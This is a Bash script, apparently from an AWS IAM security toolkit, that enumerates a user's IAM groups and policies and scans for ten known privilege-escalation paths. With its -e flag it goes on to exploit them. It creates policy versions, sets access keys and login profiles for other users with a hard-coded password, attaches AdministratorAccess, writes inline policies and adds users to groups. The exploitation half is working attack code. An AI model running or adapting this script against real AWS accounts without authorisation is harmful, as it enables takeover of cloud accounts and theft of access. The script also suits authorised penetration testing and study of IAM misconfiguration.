#!/bin/bash
RED='\e[41;97m'
WHITE='\033[0;37m'
RESET='\033[0m'
YELLOW='\033[0;93m'
TEST='\e[45m'
YEL='\e[38;5;226m'

if [[ "$1" == "-h" ]] || [[ "$1" == "--help" ]]
then
  echo "Usage:" 
  echo "-e to perform exploitation after privilege escalation scan"
  echo "-h for help"
  echo -e "Eg: \e[44;97m./iam-privesc.sh${RESET}"
  echo -e "\nFor performing exploitation after privilege escalation scan"
  echo -e "    \e[44;97m./iam-privesc.sh -e${RESET}"
  exit 1
fi

if [[ $(ls ~/.aws/config 2>&1) == *"No such file"* ]] && [[ $(ls ~/.aws/credentials 2>&1) == *"No such file"* ]];
then
  echo -e "\nPlease configure your AWS CLI by typing in the following in your terminal: \e[40;38;5;82maws configure${RESET}\n"
  exit 1		
fi
  								             

echo -e "\n"  								                                                                                                 

echo -e "${YEL}               _____          __  __        ______ _                          "
echo -e "${YEL}              |_   _|   /\   |  \/  |      |  ____| |                         "
echo -e "${YEL}                | |    /  \  | \  / |______| |__  | | ______      _____       "
echo -e "${YEL}                | |   / /\ \ | |\/| |______|  __| | |/ _  \ \ /\ / / __|      "
echo -e "${YEL}               _| |_ / ____ \| |  | |      | |    | | (_| |\ V  V /\__ \      "
echo -e "${YEL}              |_____/_/    \_\_|  |_|      |_|    |_|\__,_| \_/\_/ |___/      "
echo -e "\n"
echo -e "                        \e[44;97mBY NIKHIL SAHOO and SHIVRAM AMIRTHA${RESET}             "
echo -e "\n"
echo -e "  \e[38;5;159mAWS IAM Security Toolkit : Enumeration | Privilege Escalation | CIS Benchmarks${RESET}             "
echo -e "\n\n${YEL}==================================================================================${RESET}\n"
echo -e "                                ${RED}PRIVILEGE ESCALATION${RESET}"
echo -e "\n\n"

echo -e "\n\n\e[40;38;5;82m>>Enumeration<<${RESET}\n\n"
temp=0
abc=""
abcd=""

b=$(aws iam get-user 2>&1)
if [[ $a == *"An error"* ]]; then
  echo -e "Failed\n"
  (($temp+=1))
  
else
  echo -e "\n\e[30;48;5;82mGet User:${RESET}\n"
  CurrentUser=$(echo -e "$b\n" | jq ".User.UserName" 2>&1 | cut -d "\"" -f2)
  echo $CurrentUser

fi

a=$(aws iam list-users 2>&1)
echo -e "\n\e[30;48;5;82mList Users:${RESET}\n"

if [[ $a == *"An error"* ]]; then
  echo -e "Failed\n"
  (($temp+=1))
  if [[ $temp == 2 ]]; then
     exit 1
  fi
else
  AllUsers=$(echo -e "$a" | jq ".Users[].UserName" 2>&1 | cut -d "\"" -f2)
fi

echo -e "$AllUsers"

echo -e "\nEnter the User from above to proceed with:\n"
read awsuser

AllUsers1=$(comm -13 <(echo "$awsuser" | sort) <(echo "$AllUsers" | sort))

array1=()
while IFS= read -r au ;
do

array1+=($au)

done <<< "$AllUsers1"

c=$(aws iam list-groups-for-user --user-name $awsuser 2>&1 | jq ".Groups[].GroupName" 2>&1 | cut -d "\"" -f2)

echo -e "\n\n\e[30;48;5;82mList Groups:${RESET}\n"
if [[ $c == *"error"* ]] || [[ -z $c ]]; then
  echo -e "Failed\n"
else
  echo "$c"
  
  while IFS= read -r bkg ;
  do
  i=$(aws iam list-group-policies --group-name $bkg 2>&1 | jq ".PolicyNames[]" 2>&1 | cut -d "\"" -f2)
  echo -e "\n\e[1;4mGroup Name: $bkg${RESET}"
  echo -e "\n\e[30;48;5;82mList Group Policies:${RESET}\n"
  if [[ $i == *"error"* ]] || [[ -z $i ]]; then
   echo -e "Failed\n"
  else
   echo "$i"
   while IFS= read -r bk ;
   do
   j2=$(aws iam get-group-policy --group-name $bkg --policy-name $bk 2>&1)
   j=$(echo "$j2" | jq ".PolicyDocument.Statement[].Effect" 2>&1 | cut -d "\"" -f2 | tr -d "[]" | sed -r '/^\s*$/d' )
   echo -e "\n\n\e[30;48;5;82mGet Group Policies: $bk${RESET}\n"
   if [[ $j == *"error"* ]] || [[ -z $j ]]; then
    echo -e "Failed\n"
   else
    cooo=0


    while IFS= read -r gxyz ;
    do
    if [[ $gxyz == *"Allow"* ]]; then
       eii=$(echo "$j2" | jq ".PolicyDocument.Statement[$cooo].Action" 2>&1 | cut -d "\"" -f2 | tr -d "[]" | sed -r '/^\s*$/d' )
       eii2=$(echo "$j2" | jq ".PolicyDocument.Statement[$cooo].Resource" 2>&1 | cut -d "\"" -f2 | tr -d "[]" | sed -r '/^\s*$/d' )

       echo -e "\nAction:\n"
       echo "$eii"
       echo -e "\nResource:\n"
       echo "$eii2"
       abc=$(echo -e "$abc\n$eii") 
   
    elif [[ $gxyz == *"Deny"* ]]; then
       exx=$(echo "$j2" | jq ".PolicyDocument.Statement[$cooo].Action" 2>&1 | cut -d "\"" -f2 | tr -d "[]" | sed -r '/^\s*$/d' )
       abcd=$(echo -e "$abcd\n$exx") 
    fi
   
    ((cooo+=1))
    done <<< "$j"


   
     
   fi
   done <<< "$i" 
  
  fi 






  ij=$(aws iam list-attached-group-policies --group-name $bkg 2>&1 | jq ".AttachedPolicies[].PolicyArn" 2>&1 | cut -d "\"" -f2)
  echo -e "\n\n\e[30;48;5;82mList Group Attached Policies:${RESET}\n"
  if [[ $ij == *"error"* ]] || [[ -z $ij ]]; then
   echo -e "Failed\n"
  else
   echo "$ij" | cut -d "/" -f 2
   priv=$(echo -e "$priv\n$ij")
   while IFS= read -r ijk ;
   do
   gi=$(aws iam get-policy --policy-arn $ijk 2>&1 | jq ".Policy.DefaultVersionId" 2>&1 | cut -d "\"" -f2)
   if [[ $gi == *"error"* ]] || [[ -z $gi ]]; then
    :
   else
    hi2=$(aws iam get-policy-version --policy-arn $ijk --version-id $gi 2>&1)
    hi=$(echo "$hi2" | jq ".PolicyVersion.Document.Statement[].Effect" 2>&1 | cut -d "\"" -f2 | tr -d "[]" | sed -r '/^\s*$/d' )
    con=0
    if [[ $hi == *"error"* ]] || [[ -z $hi ]]; then
      echo -e "Failed\n"
    else
      while IFS= read -r xyzu ;
      do
      if [[ $xyzu == *"Allow"* ]]; then
       klop=$(echo -e "$ijk" | cut -d "/" -f 2)
       echo -e "\n\e[30;48;5;82mGet Group Attached Policies: $klop${RESET}\n"
       ho=$(echo "$hi2" | jq ".PolicyVersion.Document.Statement[$con].Action" 2>&1 | cut -d "\"" -f2 | tr -d "[]" | sed -r '/^\s*$/d' )
       ho2=$(echo "$hi2" | jq ".PolicyVersion.Document.Statement[$con].Resource" 2>&1 | cut -d "\"" -f2 | tr -d "[]" | sed -r '/^\s*$/d' )
       echo -e "\nAction:\n"
       echo "$ho"
       echo -e "\nResource:\n"
       echo "$ho2"
       abc=$(echo -e "$abc\n$ho")
      elif [[ $xyzu == *"Deny"* ]]; then
       ho=$(echo "$hi2" | jq ".PolicyVersion.Document.Statement[$con].Action" 2>&1 | cut -d "\"" -f2 | tr -d "[]" | sed -r '/^\s*$/d' )
       abcd=$(echo -e "$abcd\n$ho")
      
      fi
      ((con+=1))
      done <<< "$hi"
    fi
   fi
   done <<< "$ij" 
  fi
  done <<< "$c"
fi






d=$(aws iam list-user-policies --user-name $awsuser 2>&1 | jq ".PolicyNames[]" 2>&1 | cut -d "\"" -f2)
echo -e "\n\n\e[30;48;5;82mList User Policies:${RESET}\n"
if [[ $d == *"error"* ]] || [[ -z $d ]]; then
  echo -e "Failed\n"
else
  echo "$d"
  while IFS= read -r bu ;
  do
  e2=$(aws iam get-user-policy --user-name $awsuser --policy-name $bu 2>&1)
  e=$(echo "$e2" | jq ".PolicyDocument.Statement[].Effect" 2>&1 | cut -d "\"" -f2 | tr -d "[]" | sed -r '/^\s*$/d' )
  co=0
  echo -e "\n\n\e[30;48;5;82mGet User Policies: $bu${RESET}\n"

  
  if [[ $e == *"error"* ]] || [[ -z $e ]]; then
   echo -e "Failed\n"
  else
   while IFS= read -r xyz ;
   do
   if [[ $xyz == *"Allow"* ]]; then
    ei=$(echo "$e2" | jq ".PolicyDocument.Statement[$co].Action" 2>&1 | cut -d "\"" -f2 | tr -d "[]" | sed -r '/^\s*$/d' )
    ei2=$(echo "$e2" | jq ".PolicyDocument.Statement[$co].Resource" 2>&1 | cut -d "\"" -f2 | tr -d "[]" | sed -r '/^\s*$/d' )
    echo -e "\nAction:\n"
    echo "$ei"
    echo -e "\nResource:\n"
    echo "$ei2"
    abc=$(echo -e "$abc\n$ei") 
   elif [[ $xyz == *"Deny"* ]]; then
    ex=$(echo "$e2" | jq ".PolicyDocument.Statement[$co].Action" 2>&1 | cut -d "\"" -f2 | tr -d "[]" | sed -r '/^\s*$/d' )
    abcd=$(echo -e "$abcd\n$ex") 
   fi
  ((co+=1))
  done <<< "$e"
  fi
  done <<< "$d"
fi







f=$(aws iam list-attached-user-policies --user-name $awsuser | jq ".AttachedPolicies[].PolicyArn" 2>&1 | cut -d "\"" -f2)
echo -e "\n\n\e[30;48;5;82mList User Attached Policies:${RESET}\n"
if [[ $f == *"error"* ]] || [[ -z $f ]]; then
  echo -e "Failed\n"
else
  echo "$f" | cut -d "/" -f 2
  priv=$(echo -e "$priv\n$f")
  while IFS= read -r buc ;
  do
  g=$(aws iam get-policy --policy-arn $buc 2>&1 | jq ".Policy.DefaultVersionId" 2>&1 | cut -d "\"" -f2)
  if [[ $g == *"error"* ]] || [[ -z $g ]]; then 
    : 
  else

    h2=$(aws iam get-policy-version --policy-arn $buc --version-id $g 2>&1)
    h=$(echo "$h2" | jq ".PolicyVersion.Document.Statement[].Effect" 2>&1 | cut -d "\"" -f2 | tr -d "[]" | sed -r '/^\s*$/d')
    if [[ $h == *"error"* ]] || [[ -z $h ]]; then
      :
    else
      
      coo=0
      while IFS= read -r xyy ;
      do
      if [[ $xyy == *"Allow"* ]]; then
        ho=$(echo "$h2" | jq ".PolicyVersion.Document.Statement[$coo].Action" 2>&1 | cut -d "\"" -f2 | tr -d "[]" | sed -r '/^\s*$/d')
        ho2=$(echo "$h2" | jq ".PolicyVersion.Document.Statement[$coo].Resource" 2>&1 | cut -d "\"" -f2 | tr -d "[]" | sed -r '/^\s*$/d')
        klop=$(echo -e "$buc" | cut -d "/" -f 2)
        echo -e "\n\n\e[30;48;5;82mAttached User Policies Permissions: $klop${RESET}\n"
        echo -e "\nAction:\n"
        echo "$ho"
        echo -e "\nResource:\n"
        echo "$ho2"
        abc=$(echo -e "$abc\n$ho")
        
      elif [[ $xyy == *"Deny"* ]]; then
        hp=$(echo "$h2" | jq ".PolicyVersion.Document.Statement[$coo].Action" 2>&1 | cut -d "\"" -f2 | tr -d "[]" | sed -r '/^\s*$/d')
        
        abcd=$(echo -e "$abcd\n$hp")
      fi
      
      ((coo+=1))
      done <<< "$h"
    fi
  fi
  done <<< "$f" 
fi

abc=$(echo "$abc" | sort | uniq | sed '/^[[:space:]]*$/d')

echo -e "\n"

echo -e "\n\e[30;48;5;82mAllowed Permissions${RESET}\n"
if [[ -z $abc ]]; then
  echo -e "None"
else
  echo -e "$abc"
fi

abcd=$(echo "$abcd" | sort | uniq | sed '/^[[:space:]]*$/d')
echo -e "\n\e[30;48;5;82mDenied Permissions${RESET}\n"
if [[ -z $abcd ]]; then
  echo -e "None"
else
  echo -e "$abcd\n"
fi


abc=$(comm -13 <(echo "$abcd" | sort) <(echo "$abc" | sort))


newlist=()
while IFS= read -r xe ;
do
if [[ $xe == "*" ]]; then
 newlist+=("Full_Admin_Access(*)")
 continue
fi
newlist+=($xe)

done <<< "$abc"


#-----------------------------------------------------------------------------------------------------------

echo -en '\nInitiating for Privilege Escalation Scan...\n'
sleep 3

#-----------------------------------------------------------------------------------------------------------

privar=()

echo -e "\n\n\e[40;38;5;82m>>Privilege Escalation: Scan<<${RESET}\n\n"

echo -e "\n\e[30;48;5;82m1. New Policy Version Creation${RESET}\n"
flag=0
for e in "${newlist[@]}"
do
    if [[ $e ==  "iam:CreatePolicyVersion" ]] || [[ $e ==  "Full_Admin_Access(*)" ]]; then
     echo -e "\n${RED}Possible through New Policy Version Creation${RESET}\n"
     flag=1
     privar+=("1")
     break
    fi
done
if [[ $flag == 0 ]]; then
 echo -e "\nFailed\n"
fi

flag=0
echo -e "\n\e[30;48;5;82m2. Setting the default policy version${RESET}\n"

for e in "${newlist[@]}"
do
    if [[ $e ==  "iam:SetDefaultPolicyVersion" ]] || [[ $e ==  "Full_Admin_Access(*)" ]]; then
     echo -e "\n${RED}Possible through Setting the default policy version to an existing version${RESET}\n"
     flag=1
     privar+=("2")
     break
    fi
done
if [[ $flag == 0 ]]; then
 echo -e "\nFailed\n"
fi



flag=0
echo -e "\n\e[30;48;5;82m3. Creating a new user access key${RESET}\n"

for e in "${newlist[@]}"
do
    if [[ $e ==  "iam:CreateAccessKey" ]] || [[ $e ==  "Full_Admin_Access(*)" ]]; then
     echo -e "\n${RED}Possible through Creating a new user access key${RESET}\n"
     flag=1
     privar+=("3")
     break
    fi
done
if [[ $flag == 0 ]]; then
 echo -e "\nFailed\n"
fi


flag=0
echo -e "\n\e[30;48;5;82m4. Creating a new login profile${RESET}\n"

for e in "${newlist[@]}"
do
    if [[ $e ==  "iam:CreateLoginProfile" ]] || [[ $e ==  "Full_Admin_Access(*)" ]]; then
     echo -e "\n${RED}Possible through Creating a new login profile${RESET}\n"
     flag=1
     privar+=("4")
     break
    fi
done
if [[ $flag == 0 ]]; then
 echo -e "\nFailed\n"
fi


flag=0
echo -e "\n\e[30;48;5;82m5. Updating an existing login profile${RESET}\n"

for e in "${newlist[@]}"
do
    if [[ $e ==  "iam:UpdateLoginProfile" ]] || [[ $e ==  "Full_Admin_Access(*)" ]]; then
     echo -e "\n${RED}Possible through Updating an existing login profile${RESET}\n"
     flag=1
     privar+=("5")
     break
    fi
done
if [[ $flag == 0 ]]; then
 echo -e "\nFailed\n"
fi


flag=0
echo -e "\n\e[30;48;5;82m6. Attaching a policy to a user${RESET}\n"

for e in "${newlist[@]}"
do
    if [[ $e ==  "iam:AttachUserPolicy" ]] || [[ $e ==  "Full_Admin_Access(*)" ]]; then
     echo -e "\n${RED}Possible through Attaching a policy to a user${RESET}\n"
     flag=1
     privar+=("6")
     break
    fi
done
if [[ $flag == 0 ]]; then
 echo -e "\nFailed\n"
fi


flag=0
echo -e "\n\e[30;48;5;82m7. Attaching a policy to a group${RESET}\n"

for e in "${newlist[@]}"
do
    if [[ $e ==  "iam:AttachGroupPolicy" ]] || [[ $e ==  "Full_Admin_Access(*)" ]]; then
     echo -e "\n${RED}Possible through Attaching a policy to a group${RESET}\n"
     flag=1
     privar+=("7")
     break
    fi
done
if [[ $flag == 0 ]]; then
 echo -e "\nFailed\n"
fi




flag=0
echo -e "\n\e[30;48;5;82m8. Creating/updating an inline policy for a user${RESET}\n"

for e in "${newlist[@]}"
do
    if [[ $e ==  "iam:PutUserPolicy" ]] || [[ $e ==  "Full_Admin_Access(*)" ]]; then
     echo -e "\n${RED}Possible through Creating/updating an inline policy for a user${RESET}\n"
     flag=1
     privar+=("8")
     break
    fi
done
if [[ $flag == 0 ]]; then
 echo -e "\nFailed\n"
fi


flag=0
echo -e "\n\e[30;48;5;82m9. Creating/updating an inline policy for a group${RESET}\n"

for e in "${newlist[@]}"
do
    if [[ $e ==  "iam:PutGroupPolicy" ]] || [[ $e ==  "Full_Admin_Access(*)" ]]; then
     echo -e "\n${RED}Possible through Creating/updating an inline policy for a group${RESET}\n"
     flag=1
     privar+=("9")
     break
    fi
done
if [[ $flag == 0 ]]; then
 echo -e "\nFailed\n"
fi



flag=0
echo -e "\n\e[30;48;5;82m10. Adding a user to a group${RESET}\n"

for e in "${newlist[@]}"
do
    if [[ $e ==  "iam:AddUserToGroup" ]] || [[ $e ==  "Full_Admin_Access(*)" ]]; then
     echo -e "\n${RED}Possible through Adding a user to a group${RESET}\n"
     flag=1
     privar+=("10")
     break
    fi
done
if [[ $flag == 0 ]]; then
 echo -e "\nFailed\n"
fi


if [[ $1 == "-e" ]]; then
#--------------------------------------------------------------------------------------------------------------------

	while IFS= read -r yu ;
	do

	if [[ $yu =~ [0-9] ]]; then
		priv1=$(echo -e "$priv1\n$yu")
	fi
	done <<< "$priv"
#-----------------------------------------------------------------------------------------------------------

        echo -en '\nInitiating for Privilege Escalation Exploitation...\n'
        sleep 4

#-----------------------------------------------------------------------------------------------------------

	echo -e "\n\n\e[40;38;5;82m>>Privilege Escalation: Exploitation<<${RESET}\n\n"

#--------------------------------------------------------------------------------------------------------------------

	val="1"
	if [[ " ${privar[@]} " =~ " ${val} " ]]; then

		echo -e "\n\e[30;48;5;82m1. Create Policy Version${RESET}\n"


		if [[ -z $priv1 ]]; then
		 echo -e "\nNo Custom Attached Policies\n"
		else
	 
		 echo -e "\n$priv1\n" | sort -u | uniq
		 echo -e "\nSpecify the policy from above that you wish to modify:\n"
		 read obj
		 priv1esc=$(aws iam create-policy-version --policy-arn $obj --policy-document file://$PWD/policy.json --set-as-default 2>&1)
		  if [[ $priv1esc == *"error"* ]] || [[ $priv1esc == *"failed"* ]] || [[ $priv1esc == *"denied"* ]] || [[ -z $priv1esc ]]; then
		   echo -e "\nFailed\n"
		  else
		   echo -e "\n\e[44;97mSuccessfully escalated privileges${RESET}\n"
		  fi

		fi
	fi


#--------------------------------------------------------------------------------------------------------------------

	val="2"
	if [[ " ${privar[@]} " =~ " ${val} " ]]; then

		echo -e "\n\e[30;48;5;82m2. Set Default Policy Version${RESET}\n"


		if [[ -z $priv1 ]]; then
		 echo -e "\nNo Custom Attached Policies\n"
		else
		 
		 echo -e "\n$priv1\n" | sort -u | uniq
		 echo -e "\nSpecify the policy from above with which you would like to proceed forward\n"
		 read obj
		 priv1esc=$(aws iam list-policy-versions --policy-arn $obj 2>&1 | jq ".Versions[].VersionId" | cut -d "\"" -f 2 )
		 if [[ $priv1esc == *"error"* ]] || [[ $priv1esc == *"denied"* ]] || [[ -z $priv1esc ]] || [[ $priv1esc == *"failed"* ]]; then
		   echo -e "\nFailed\n"
		  else
		   while IFS= read -r yu ;
		   do
		   echo -e "\n$yu\n"
		   hl=$(aws iam get-policy-version --policy-arn $obj --version-id $yu 2>&1 | jq '.PolicyVersion.Document.Statement[] | "\(.Effect) \(.Action[])"' 2>&1 | cut -d "\"" -f2 | tr -d "[]" | sed -r '/^\s*$/d')
		   hm=$(aws iam get-policy-version --policy-arn $obj --version-id $yu 2>&1 | jq '.PolicyVersion.Document.Statement[].Resource[]' 2>&1 | cut -d "\"" -f2 | tr -d "[]" | sed -r '/^\s*$/d')
		   echo -e "Actions\n"
		   echo -e "$hl\n"
		   echo -e "Resources\n"
		   echo -e "$hl\n"

		   done <<< "$priv1esc"
		   echo -e "\nSpecify the version that you would like to use\n"
		   read obj2
		   priv1es=$(aws iam set-default-policy-version --policy-arn $obj --version-id $obj2 2>&1)
		   if [[ $priv1es == *"error"* ]] || [[ $priv1es == *"denied"* ]] || [[ $priv1es == *"failed"* ]]; then
		    echo -e "\nFailed\n"
		   else
		    echo -e "\n\e[44;97mSuccessfully escalated privileges${RESET}\n"
		   fi

		   
		  fi
		fi

	fi


#--------------------------------------------------------------------------------------------------------------------

	val="3"
	if [[ " ${privar[@]} " =~ " ${val} " ]]; then

		echo -e "\n\e[30;48;5;82m3. Creating a new user access key${RESET}\n"


		if [[ -z $array1 ]]; then
		 echo -e "\nNo Additional Users Present\n"
		else
	 
		 echo -e $array1
		 echo -e "\nSpecify a User from above for whom you wish to create a new user access key:\n"
		 read obj
		 priv1esc=$(aws iam create-access-key --user-name $obj 2>&1)
		  if [[ $priv1esc == *"error"* ]] || [[ $priv1esc == *"LimitExceeded"* ]] || [[ $priv1esc == *"denied"* ]] || [[ -z $priv1esc ]]; then
		   echo -e "\nFailed\n"
		  else
		   echo -e "\n\e[44;97mSuccessfully escalated privileges${RESET}\n"
		  fi

		fi
	fi


#--------------------------------------------------------------------------------------------------------------------

	val="4"
	if [[ " ${privar[@]} " =~ " ${val} " ]]; then

		echo -e "\n\e[30;48;5;82m4. Creating a new login profile${RESET}\n"


		if [[ -z $array1 ]]; then
		 echo -e "\nNo Additional Users Present\n"
		else
	 
		 echo -e $array1
		 echo -e "\nSpecify a User from above for whom you wish to create a new login profile:\n"
		 read obj
		 priv1esc=$(aws iam create-login-profile --user-name $obj --password ']#em)^-$Of3)Z)n1G5[jjHc)XEDlc0yr2MsPpsR;F|G64dt-e}p^ynH\\ZRw8lfL:{>fIB,S\H&gdl4rw_B0W=zyDuOFj?R@|%W&Hf#`xt[J>tS:{Q#Z;l+ItO#^iu)' --no-password-reset-required 2>&1)
		  if [[ $priv1esc == *"error"* ]] || [[ $priv1esc == *"EntityAlreadyExists"* ]] || [[ $priv1esc == *"denied"* ]] || [[ -z $priv1esc ]]; then
		   echo -e "\nFailed\n"
		  else
		   echo -e "\n\e[44;97mSuccessfully escalated privileges${RESET}\n"
		  fi

		fi
	fi

#--------------------------------------------------------------------------------------------------------------------

	val="5"
	if [[ " ${privar[@]} " =~ " ${val} " ]]; then

		echo -e "\n\e[30;48;5;82m5. Updating an existing login profile${RESET}\n"


		if [[ -z $array1 ]]; then
		 echo -e "\nNo Additional Users Present\n"
		else
	 
		 echo -e $array1
		 echo -e "\nSpecify a User from above for whom you wish to Update login profile:\n"
		 read obj
		 priv1esc=$(aws iam update-login-profile --user-name $obj --password ']#em)^-$Of3)Z)n1G5[jjHc)XEDlc0yr2MsPpsR;F|G64dt-e}p^ynH\\ZRw8lfL:{>fIB,S\H&gdl4rw_B0W=zyDuOFj?R@|%W&Hf#`xt[J>tS:{Q#Z;l+ItO#^iu)' --no-password-reset-required 2>&1)
		  if [[ $priv1esc == *"error"* ]] || [[ $priv1esc == *"EntityAlreadyExists"* ]] || [[ $priv1esc == *"denied"* ]] || [[ -z $priv1esc ]]; then
		   echo -e "\nFailed\n"
		  else
		   echo -e "\n\e[44;97mSuccessfully escalated privileges${RESET}\n"
		  fi

		fi
	fi

#--------------------------------------------------------------------------------------------------------------------



	val="6"
	if [[ " ${privar[@]} " =~ " ${val} " ]]; then

		echo -e "\n\e[30;48;5;82m6. Attaching a policy to a user${RESET}\n"

		#obj=$(echo -e "$awsuser\n" | jq ".User.UserName" 2>&1 | cut -d "\"" -f2)

		priv1es=$(aws iam attach-user-policy --user-name $awsuser --policy-arn arn:aws:iam::aws:policy/AdministratorAccess 2>&1)

		if [[ $priv1es == *"error"* ]] || [[ $priv1es == *"denied"* ]] || [[ $priv1es == *"failed"* ]]; then
		  echo -e "\nFailed\n"
		else
		  echo -e "\n\e[44;97mSuccessfully escalated privileges${RESET}\n"
		fi

	fi

#--------------------------------------------------------------------------------------------------------------------

	val="7"
	if [[ " ${privar[@]} " =~ " ${val} " ]]; then

		echo -e "\n\e[30;48;5;82m7. Attaching a policy to a group${RESET}\n"

		echo -e "\nList of groups\n"

		echo "$c"
        
                if [[ -z $c ]]; then
                  echo -e "\nNo Groups Available\n"
                else
		  echo -e "\nSpecify the group from above with which you would like to proceed forward\n"
		  read obj

		  priv1es=$(aws iam attach-group-policy --group-name $obj --policy-arn arn:aws:iam::aws:policy/AdministratorAccess 2>&1)

		  if [[ $priv1es == *"error"* ]] || [[ $priv1es == *"denied"* ]] || [[ $priv1es == *"failed"* ]]; then
		   echo -e "\nFailed\n"
		  else
		   echo -e "\n\e[44;97mSuccessfully escalated privileges${RESET}\n"
		  fi
                fi

	fi

#--------------------------------------------------------------------------------------------------------------------

	val="8"
	if [[ " ${privar[@]} " =~ " ${val} " ]]; then

		echo -e "\n\e[30;48;5;82m8. Creating/updating an inline policy for a user${RESET}\n"

		#obj=$(echo -e "$awsuser\n" | jq ".User.UserName" 2>&1 | cut -d "\"" -f2)

		echo -e "\nEnter a policy name(could be new or existing):\n"
		read obj2

		priv1es=$(aws iam put-user-policy --user-name $awsuser --policy-name $obj2 --policy-document file://$PWD/policy.json 2>&1)

		if [[ $priv1es == *"error"* ]] || [[ $priv1es == *"denied"* ]] || [[ $priv1es == *"failed"* ]]; then
		  echo -e "\nFailed\n"
		else
		  echo -e "\n\e[44;97mSuccessfully escalated privileges${RESET}\n"
		fi


	fi
#--------------------------------------------------------------------------------------------------------------------
	val="9"
	if [[ " ${privar[@]} " =~ " ${val} " ]]; then

		echo -e "\n\e[30;48;5;82m9. Creating/updating an inline policy for a group${RESET}\n"

		echo -e "\nList of groups\n"

		echo "$c"

                if [[ -z $c ]]; then
                  echo -e "\nNo Groups Available\n"
                else

		  echo -e "\nSpecify the group from above with which you would like to proceed forward\n"
		  read obj

		  echo -e "\nEnter a policy name(could be new or existing):\n"
		  read obj2

		  priv1es=$(aws iam put-group-policy --group-name $obj --policy-name $obj2 --policy-document file://$PWD/policy.json 2>&1)

		  if [[ $priv1es == *"error"* ]] || [[ $priv1es == *"denied"* ]] || [[ $priv1es == *"failed"* ]]; then
		   echo -e "\nFailed\n"
		  else
		   echo -e "\n\e[44;97mSuccessfully escalated privileges${RESET}\n"
		  fi
                fi

	fi

#--------------------------------------------------------------------------------------------------------------------
	val="10"
	if [[ " ${privar[@]} " =~ " ${val} " ]]; then


		echo -e "\n\e[30;48;5;82m10. Adding a user to a group${RESET}\n"
			
		lisgro=$(aws iam list-groups 2>&1 | jq '.Groups[].GroupName' | cut -d "\"" -f2)



		#obj=$(echo -e "$awsuser\n" | jq ".User.UserName" 2>&1 | cut -d "\"" -f2)

		obj4=$(comm -13 <(echo "$c" | sort) <(echo "$lisgro" | sort))
		
		if [[ -z $obj4 ]]; then
		 echo -e "\nFailed\n"
		else
		
		 echo "$obj4"
		 echo -e "\nSpecify the group from above with which you would like to proceed forward\n"
		 read obj2

		 priv1es=$(aws iam add-user-to-group --group-name $obj2 --user-name $awsuser 2>&1)

		 if [[ $priv1es == *"error"* ]] || [[ $priv1es == *"denied"* ]] || [[ $priv1es == *"failed"* ]]; then
		  echo -e "\nFailed\n"
		 else
		  echo -e "\n\e[44;97mSuccessfully escalated privileges${RESET}\n"
		 fi
		fi


	fi

#--------------------------------------------------------------------------------------------------------------------
fi

echo -e "\n ${YEL}Privilege Escalation Check Complete. Thanks !!!${RESET}"
echo -e "\n\n${YEL}==================================================================================${RESET}\n"


